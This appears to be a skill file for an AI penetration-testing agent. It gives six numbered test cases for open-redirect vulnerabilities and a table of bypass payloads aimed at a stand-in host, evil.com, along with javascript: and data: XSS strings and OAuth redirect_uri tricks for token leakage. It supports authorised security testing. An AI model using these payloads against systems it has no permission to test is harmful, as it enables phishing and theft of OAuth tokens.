# Open Redirect Hunting Skill — 6 Test Cases

> Load when: open redirect, URL redirect, unvalidated redirect, OAuth redirect.

## 134. Basic open redirect (easy)
Find parameters: `?redirect=`, `?next=`, `?returnUrl=`, `?url=`, `?continue=`. Test: `http://evil.com`, `//evil.com`, `/\/evil.com`, `//evil%00.com`.

## 135. Open redirect via path traversal (medium)
Test: `/../evil.com`, `/..%2f..%2fevil.com`, `/\/evil.com`, `/\evil.com`. Report bypasses.

## 136. Open redirect in OAuth callback (hard)
If OAuth server validates redirect_uri, test subdomain tricks: `https://app.evil.com`, `https://evil.com/app`. Report token leakage.

## 137. Open redirect via JavaScript (medium)
If redirect is client-side JS: `?redirect=javascript:alert(1)` or `?redirect=data:text/html,<script>alert(1)</script>`. Report XSS via redirect.

## 138. Open redirect via URL parsing confusion (hard)
Test: `http://evil.com@legit.com`, `http://legit.com:evil.com`, `http://legit.com\@evil.com`. Report parser inconsistencies.

## 139. Open redirect via CNAME (hard)
If redirect validates domain suffix, try CNAME to attacker domain: `app.legitimate.com` → CNAME → `evil.com`. Report bypass.

---

## Redirect Bypass Payloads
| Payload | Use Case |
|---------|----------|
| `http://evil.com` | Direct URL |
| `//evil.com` | Protocol-relative |
| `/../evil.com` | Path traversal |
| `//evil%00.com` | Null byte |
| `http://legit.com@evil.com` | Authority confusion |
| `//evil%E3%80%82com` | Unicode dot |
| `//evil.com\` | Backslash |
